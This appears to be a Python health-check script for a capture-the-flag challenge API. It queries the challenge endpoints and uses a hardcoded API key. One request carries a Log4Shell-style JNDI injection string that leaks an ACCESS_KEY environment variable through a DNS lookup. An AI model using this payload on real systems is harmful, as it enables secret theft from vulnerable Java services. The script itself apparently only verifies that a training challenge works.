import sys
import urllib.request
import json

SWAGGER_URI="/api/swagger.json"
CHECK_URI="/api/check"
FACILITY_URI="/api/facility"

API_KEY="TEVfQ09OVEVYVEVfRVNUX0lOVEVSRVNTQU5U"


def http(url, body=None, headers={}):
	if body:
		data = urllib.parse.urlencode(body)
		data = data.encode('ascii')
	else:
		data= body
		
	req = urllib.request.Request(url, data, headers)
	
	try:
		response = urllib.request.urlopen(req)
	except:
		print("[!] " + url + " bad response")
		return False
	else:
		print("\n[+] Response of " + url + " is consistent")
		print(str(response.read()))
		return True

def usage():
       print("usage: " + sys.argv[0] + " <api-url>")
       print("example: " + sys.argv[0] + " http://127.0.0.1:80")
       
def main():
	

	if len(sys.argv) < 2 or len(sys.argv) > 2 :
		usage()

	else:
	
		api = sys.argv[1]
	
		print("Running challenge checks...")
		
		everythingOk = True
		
		everythingOk = everythingOk and http(api + SWAGGER_URI)
		everythingOk = everythingOk and http(api + CHECK_URI, {"prenom": "test", "nom": "test"})
		everythingOk = everythingOk and http(api + CHECK_URI, {"prenom": "${jndi:dns://${env:ACCESS_KEY}.localhost}", "nom": "test"})		
		
		
		everythingOk = everythingOk and http(api + FACILITY_URI, None, {"X-API-Key": API_KEY})
		
		if everythingOk:
			print("\nChallenge is correctly working")
		else:
			print("\nChallenge is NOT correctly working")

if __name__ == '__main__':
	main()